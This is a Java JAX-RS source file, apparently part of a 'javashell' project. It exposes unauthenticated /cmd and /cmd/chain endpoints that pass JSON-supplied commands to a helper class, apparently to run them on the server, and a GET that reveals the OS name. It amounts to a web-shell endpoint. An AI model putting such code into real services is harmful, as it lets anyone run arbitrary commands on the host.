package com.javashell.shell;

import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.core.MediaType;


@Path("/cmd")
public class Service {
  
  @GET
  public String sayHello(){
    return System.getProperty("os.name");
  }
  
  @POST
  @Consumes(MediaType.APPLICATION_JSON)
  public String execute(CommandType cmd){
    Logic logic = new Logic();
    return logic.executeCommand(cmd.getCommand());
  }
  
  @POST
  @Path("/chain")
  @Consumes(MediaType.APPLICATION_JSON)
  public String executeChain(CommandsType cmds){
    Logic logic = new Logic();
    
    return logic.executeCommands(cmds.getCommands());
  }
}
